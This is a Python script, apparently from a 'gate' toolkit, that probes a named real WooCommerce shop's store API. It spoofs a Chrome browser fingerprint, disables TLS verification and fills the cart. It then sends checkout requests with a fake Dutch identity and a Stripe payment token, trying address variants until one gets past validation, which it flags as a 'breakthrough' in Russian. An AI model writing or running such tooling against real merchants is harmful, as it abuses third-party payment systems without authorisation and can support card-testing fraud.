# -*- coding: utf-8 -*-
import asyncio, json, os, sys
sys.stdout.reconfigure(encoding="utf-8")
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from curl_cffi.requests import AsyncSession
import gate_client as gc

async def main():
    root = "https://magnesiumshop.nl"
    async with AsyncSession(impersonate="chrome131", verify=False) as s:
        api = f"{root}/wp-json/wc/store/v1"
        r_cart = await s.get(f"{api}/cart", timeout=10)
        nn = r_cart.headers.get("nonce")
        r_prod = await s.get(f"{api}/products", params={"per_page": 30}, headers={"Nonce": nn}, timeout=10)
        nn = r_prod.headers.get("nonce") or nn
        cand = sorted((p for p in r_prod.json() if p.get("prices", {}).get("price") and int(p["prices"]["price"]) > 0),
                      key=lambda p: int(p["prices"]["price"]))
        p0 = cand[0]
        r_add = await s.post(f"{api}/cart/add-item", params={"id": p0["id"], "quantity": "1"}, headers={"Nonce": nn}, timeout=10)
        nn = r_add.headers.get("nonce") or nn
        ident = gc.random_identity("NL")
        variants = [
            ("no-state", None, "Damstraat 42"),
            ("empty-state", "", "Damstraat 42"),
            ("number-first", None, "42 Damstraat"),
            ("no-number", None, "Damstraat"),
        ]
        for name, state, a1 in variants:
            mk = {
                "first_name": ident["first_name"], "last_name": ident["last_name"], "company": "",
                "address_1": a1, "address_2": "", "city": "Amsterdam",
                "postcode": "1012 AB", "country": "NL", "email": ident["email"],
                "phone": "+31 20 555 0123"}
            if state is not None:
                mk["state"] = state
            body = {"billing_address": mk, "shipping_address": dict(mk),
                "customer_note": "", "create_account": False, "terms": True,
                "payment_method": "stripe_cc",
                "payment_data": [{"key": "wc-stripe-payment-method", "value": "pm_card_visa_chargeDeclined"},
                                 {"key": "wc-stripe-payment-type", "value": "card"}]}
            r_co = await s.post(f"{api}/checkout", json=body, headers={"Nonce": nn}, timeout=20)
            nn = r_co.headers.get("nonce") or nn
            try: d = r_co.json()
            except Exception: d = {}
            params = d.get("data", {}).get("params")
            print(f"[{name}] {r_co.status_code} code={d.get('code')} params={json.dumps(params, ensure_ascii=False)[:200]}")
            if not (d.get("code") == "rest_invalid_param" and params and
                    ("shipping_address" in params or "billing_address" in params)):
                print("  -> ПРОРЫВ! msg:", str(d.get("message"))[:150])
                break

asyncio.run(main())
